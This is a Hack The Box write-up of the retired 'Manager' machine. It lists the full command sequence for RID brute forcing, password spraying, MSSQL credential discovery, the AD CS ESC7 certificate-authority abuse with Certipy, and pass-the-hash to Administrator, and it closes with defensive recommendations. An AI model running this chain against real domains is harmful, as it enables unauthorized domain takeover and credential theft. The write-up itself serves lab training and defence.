---
title: "Manager — AD CS ESC7 via Certificate Authority Abuse"
description: "RID brute forcing, password spraying, and a legacy backup expose ManageCA rights, enabling the AD CS ESC7 abuse chain to domain compromise."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ad-cs
  - esc7
  - credential-spray
  - mssql
objective: "Escalate from unauthenticated enumeration to domain compromise by recovering credentials and abusing AD CS ManageCA rights through ESC7."
tools:
  - nmap
  - NetExec
  - impacket-mssqlclient
  - BloodHound
  - evil-winrm
  - Certipy
skill: "Active Directory enumeration and AD CS (ESC7) certificate-authority abuse"
outcome: "Standard-user WinRM foothold and Administrator NT-hash recovery via ESC7, shown by a pass-the-hash Administrator session"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows Active Directory domain; Domain Controller hosting AD CS, with MSSQL (1433), SMB (445), and WinRM (5985) |
| Starting position | Unauthenticated network access |
| Objective | Escalate from unauthenticated enumeration to domain compromise by recovering credentials and abusing AD CS ManageCA rights through ESC7 |
| Outcome | Standard-user WinRM foothold and Administrator NT-hash recovery through ESC7, shown by a pass-the-hash Administrator session |

## RID spray to AD CS ESC7

Manager is a Medium-rated Hack The Box Active Directory lab. RID brute forcing enumerates domain users, and a username-as-password spray recovers one account. MSSQL access as that account exposes an old website backup holding a second credential, and the second account holds `ManageCA` rights over the Enterprise CA. Those rights enable the AD CS ESC7 chain: officer assignment, template enablement, failed-request issuance, certificate retrieval, and NT-hash recovery for domain compromise. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **RID brute forcing → username-as-password spray → MSSQL backup discovery → WinRM foothold → BloodHound rights collection → AD CS ESC7 (officer assignment → template enablement → failed-request issuance → certificate retrieval) → NT-hash recovery → pass-the-hash Administrator**

## AD controller with AD CS and MSSQL, no credentials

- **Target:** a Windows Active Directory domain whose Domain Controller also hosts an Enterprise CA (AD CS), alongside MSSQL (1433), SMB (445), and WinRM (5985).
- **Starting position:** unauthenticated network access, with no credentials provided.
- **Objective:** enumerate domain users, recover initial credentials, and escalate to domain compromise through AD CS abuse, not a software memory-corruption or remote-code-execution flaw.
- **Environment:** Hack The Box lab; all activity was confined to the platform's isolated lab environment.

## Evidence: RID spray, MSSQL backup, and ESC7 to DA

### 1. Service Enumeration

Observation: the target exposes standard AD services plus MSSQL and WinRM, with AD CS present on the Domain Controller.

```bash
nmap -sC -sV -p- -Pn -oA <OUT_PREFIX> <TARGET_IP> -T5
```

Truncated scan output:

```text
Domain: <DOMAIN>
MSSQL: 1433/tcp
SMB: 445/tcp
WinRM: 5985/tcp
AD CS present on <DC_HOST>
```

Significance: MSSQL provides filesystem-level access once authenticated, and the AD CS role on the Domain Controller is the eventual escalation surface.

Result: an AD domain is reachable with MSSQL, SMB, WinRM, and AD CS exposed.

### 2. User Enumeration and Credential Spray

Observation: null or guest SMB access is limited, but RID brute forcing recovers domain usernames.

Action: enumerate users by RID brute force, then spray each username as its own password.

```bash
nxc smb <TARGET_IP> -u 'Guest' -p '' --rid-brute
```

Build a user list, then spray:

```bash
nxc smb <DOMAIN> -u <USERLIST> -p <USERLIST> --no-bruteforce --continue-on-success
```

The spray returns one valid credential pair:

```text
<DOMAIN>\<OPERATOR_USER> : <OPERATOR_PASSWORD>
```

Significance: usernames are discoverable without credentials, and one account accepts its username as its password; this account is the entry point into the domain services.

Result: valid credentials for one domain account were recovered and validated through SMB authentication.

### 3. MSSQL Enumeration: Legacy Backup Discovery

Observation: the recovered credential authenticates to MSSQL through Windows authentication.

Action: connect and enumerate the web root.

```bash
impacket-mssqlclient <DOMAIN>/<OPERATOR_USER>:<OPERATOR_PASSWORD>@<TARGET_IP> -windows-auth
```

The web root contains an old website backup archive:

```text
website-backup-27-07-23-old.zip
```

A configuration file inside the archive holds a second credential pair for a different domain account (sanitized):

```xml
<access-user>
  <user><SECOND_USER>@<DOMAIN></user>
  <password><SECOND_PASSWORD></password>
</access-user>
```

Significance: MSSQL filesystem access commonly exposes legacy backups and configuration files, and this backup embedded an active credential for a more privileged account.

Result: a second credential pair was recovered from the backup configuration; it is validated later through WinRM.

### 4. BloodHound Collection

Observation: the second account's effective privileges still need mapping to find a route to the CA.

Action: collect domain objects and privilege edges with BloodHound CE.

```bash
bloodhound-ce-python \
  -d <DOMAIN> \
  -u '<SECOND_USER>' \
  -p '<SECOND_PASSWORD>' \
  -c all \
  -gc <DC_HOST>
```

Significance: collecting AD objects and ACL edges as an authenticated domain user is how non-obvious rights such as certificate-authority management (`ManageCA`) rights surface, subsequently confirmed with `certipy find`; the CA relationship is what the ESC7 chain ultimately requires.

Result: domain objects and privilege edges were collected for the second account.

### 5. Foothold: WinRM Login

Observation: the second account has WinRM access, and the recovered credential fits it.

Action: authenticate interactively over WinRM.

```bash
evil-winrm -i <TARGET_IP> -u '<SECOND_USER>' -p '<SECOND_PASSWORD>'
```

Authentication returns a shell:

```text
*Evil-WinRM* PS C:\Users\<SECOND_USER>\Desktop>
```

Significance: this confirms the recovered credential is valid and yields interactive code execution as a domain user.

Result: an interactive WinRM session as `<SECOND_USER>` was established.

### 6. AD CS ESC7: CA Officer and Template Abuse

Observation: the second account holds `ManageCA` rights over the Enterprise CA (`<CA_NAME>`), which ESC7 abuses to issue certificates for high-value accounts.

Action: enumerate the vulnerable certificate path with Certipy.

```bash
certipy find \
  -dc-ip <TARGET_IP> \
  -u '<SECOND_USER>@<DOMAIN>' \
  -p '<SECOND_PASSWORD>' \
  -vulnerable -stdout -enable
```

The vulnerable path is ESC7 through CA officer and template manipulation.

Step 1: Add the second account as a CA officer:

```bash
certipy ca \
  -ca '<CA_NAME>' \
  -add-officer <SECOND_USER> \
  -username <SECOND_USER>@<DOMAIN> \
  -p '<SECOND_PASSWORD>'
```

Step 2: Enable the `SubCA` template:

```bash
certipy ca \
  -username <SECOND_USER>@<DOMAIN> \
  -p '<SECOND_PASSWORD>' \
  -ca '<CA_NAME>' \
  -enable-template 'SubCA'
```

Step 3: Request a SubCA certificate as Administrator; the request failed, but it created a request ID. I kept the request ID because a CA officer can still issue it.

```bash
certipy req \
  -username <SECOND_USER>@<DOMAIN> \
  -p '<SECOND_PASSWORD>' \
  -ca '<CA_NAME>' \
  -template SubCA \
  -upn administrator@<DOMAIN>
```

Step 4: Issue the failed request as a CA officer:

```bash
certipy ca \
  -username <SECOND_USER>@<DOMAIN> \
  -p '<SECOND_PASSWORD>' \
  -ca '<CA_NAME>' \
  -issue-request <REQUEST_ID>
```

Step 5: Retrieve the issued certificate:

```bash
certipy req \
  -username <SECOND_USER>@<DOMAIN> \
  -p '<SECOND_PASSWORD>' \
  -ca '<CA_NAME>' \
  -retrieve <REQUEST_ID>
```

Step 6: Authenticate with the retrieved certificate and recover the Administrator NT hash:

```bash
certipy auth -pfx administrator.pfx -dc-ip <TARGET_IP>
```

```text
Got hash for 'administrator@<DOMAIN>':
<LM_HASH>:<NT_HASH>
```

Significance: ESC7 chains `ManageCA` rights through officer assignment, template enablement, and failed-request issuance to obtain a certificate for any account. PKINIT authentication with that certificate exposes the account's NT hash, so pass-the-hash needs no cracking.

Result: an Administrator certificate was issued and its PKINIT authentication returned the Administrator NT hash.

### 7. Full Compromise: Pass-the-Hash

Observation: the recovered NT hash can authenticate directly, without the plaintext password.

Action: authenticate as Administrator using the hash.

```bash
evil-winrm -i <TARGET_IP> -u Administrator -H '<NT_HASH>'
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

Significance: pass-the-hash grants administrative code execution and completes the escalation from an unauthenticated position.

Result: an interactive Administrator session was established.

## Limited anonymous SMB and a failed certificate request

| Challenge | Decision | Rationale |
|---|---|---|
| Null or guest SMB access yielded limited results | Switched to RID brute forcing to enumerate usernames | RID enumeration exposed domain users that anonymous access did not |
| The Administrator certificate request failed | Issued the failed request afterward as a CA officer, then retrieved it | A CA officer can authorize a pending request, so a failed request is not a dead end |

## Outcome: WinRM foothold and Administrator NT hash

Authenticated user access rests on validated SMB and WinRM sessions, and administrative control rests on a pass-the-hash Administrator session against the recovered NT hash. The escalation relies on a weak credential policy, a legacy backup exposed through MSSQL filesystem access, and an over-privileged `ManageCA` right. Passwords, hashes, addresses, and domain/host/CA identifiers are omitted, and where the source captured no tool output for the ESC7 sub-steps I could not verify them, so they are reported as source-recorded rather than output-verified.

## Recommendations: user enumeration, backup secrets, and ManageCA rights

Every action below is a recommendation. No validation is documented.

1. **Usernames are enumerable and reused as passwords.** Root cause: RID enumeration exposes account names, and at least one account's password equals its username. Demonstrated impact: a single quiet spray recovered a working domain credential. *Recommendation:* enforce length and complexity policy, reject usernames and common patterns as passwords, and set lockout thresholds. *Detection:* detect repeated authentication failures or many distinct accounts attempted from one source.
2. **MSSQL filesystem access exposed a legacy backup with a plaintext credential.** Root cause: authenticated MSSQL access could read a web-root backup whose configuration file stored a credential in cleartext. Demonstrated impact: a more privileged account's credential was recovered without exploitation. *Recommendation:* remove secrets from backups and configuration files, restrict the database service's filesystem reach, and rotate any credential that has ever appeared in a backup. *Validation:* scan backup and export artifacts for secrets before storage.
3. **An over-privileged `ManageCA` right enabled ESC7.** Root cause: a standard user held `ManageCA` over the Enterprise CA, permitting officer assignment and template enablement. Demonstrated impact: a certificate for the Administrator account was issued and its NT hash recovered, yielding full domain compromise. *Recommendation:* restrict CA officer and CA-manager rights to dedicated administrative accounts, and review certificate templates for sensitive enrollee permissions. *Detection:* monitor CA officer additions, template enablement, and failed-then-issued request sequences.

## References

- [Hack The Box — Manager](https://app.hackthebox.com/machines/Manager) (retired machine)
- [Certipy](https://github.com/ly4k/Certipy) (AD CS enumeration and abuse, including ESC7)
- [Certificate authority roles and officer rights — [MS-CSRA] (Microsoft Learn)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-csra/c6451297-197d-4b4b-b786-3f3187b67b8f) (`ManageCA`/CA officer rights model)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB enumeration and credential spraying)
- [Impacket](https://github.com/fortra/impacket) (`mssqlclient` for MSSQL access)
- [BloodHound Community Edition](https://github.com/SpecterOps/BloodHound) (AD object and privilege-edge collection)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM interactive shell)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
